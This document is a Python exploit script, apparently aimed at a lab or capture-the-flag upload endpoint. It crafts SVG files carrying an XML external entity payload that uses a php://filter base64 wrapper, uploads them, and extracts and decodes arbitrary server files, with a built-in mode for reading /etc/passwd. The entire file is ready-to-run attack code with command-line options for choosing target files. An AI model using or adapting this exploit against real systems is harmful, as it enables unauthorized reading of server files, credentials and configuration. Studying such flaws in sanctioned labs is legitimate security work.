import re
import requests
import base64
import argparse
import urllib3
from datetime import datetime

urllib3.disable_warnings()

# ---------- CONFIGURATION ----------
UPLOAD_URL = 'http://94.237.50.221:59862/contact/upload.php'  # CHANGE THIS to actual upload endpoint
PROXIES = {
    'http': 'http://127.0.0.1:8080',  # Burp proxy
    'https': 'http://127.0.0.1:8080',
}
USE_PROXY = False  # Set to False to disable Burp proxying
VERIFY_SSL = False
# -----------------------------------

def craft_svg_xxe(payload: str) -> bytes:
    """
    Craft malicious SVG with XXE payload embedded.
    """
    svg_template = f'''<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
<!ENTITY xxe SYSTEM "{payload}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="200">
  <text x="10" y="50">&xxe;</text>
</svg>'''
    return svg_template.encode()

def upload_svg(svg_data: bytes, filename: str) -> str:
    """
    Upload malicious SVG and return server response.
    """
    now = datetime.now().strftime('%y%m%d')
    files = {
        'uploadFile': (f"{now}_{filename}", svg_data, 'image/svg+xml')
    }
    response = requests.post(
        UPLOAD_URL,
        files=files,
        proxies=PROXIES if USE_PROXY else {},
        verify=VERIFY_SSL
    )
    return response.text

def decode_base64_data(data: str) -> str:
    try:
        return base64.b64decode(data.encode()).decode()
    except Exception as e:
        return f"[!] Failed to decode: {e}"

def extract_svg_output(html: str) -> str:
    """
    Extract content from <text> tag in response if server reflects it.
    """
    from re import search
    m = search(r'<text[^>]*>(.*?)</text>', html, flags=re.DOTALL)
    if m:
        return m.group(1).strip()
    return "[!] No <text> content found in response."

def run_file_read(path: str, decode: bool = True):
    """
    Exploit XXE to read a file from the server (base64 encoded).
    """
    payload = f'php://filter/read=convert.base64-encode/resource={path}'
    svg_data = craft_svg_xxe(payload)
    print(f"[+] Uploading malicious SVG to read: {path}")
    res = upload_svg(svg_data, 'evil.svg')
    extracted = extract_svg_output(res)
    print(f"[+] Raw response: {extracted}")
    if decode:
        print(f"[+] Decoded:\n{decode_base64_data(extracted)}")

def run_enum_etc_passwd():
    """
    Quick enumeration by reading /etc/passwd
    """
    print("[*] Enumerating with /etc/passwd...")
    run_file_read('/etc/passwd')

def main():
    parser = argparse.ArgumentParser(description="XXE SVG Exploit Script with Proxy Support")
    parser.add_argument('--read', help="File path to read on the server")
    parser.add_argument('--nodecode', action='store_true', help="Disable base64 decoding of output")
    parser.add_argument('--enum', action='store_true', help="Enumerate /etc/passwd")
    args = parser.parse_args()

    if args.enum:
        run_enum_etc_passwd()
    elif args.read:
        run_file_read(args.read, decode=not args.nodecode)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
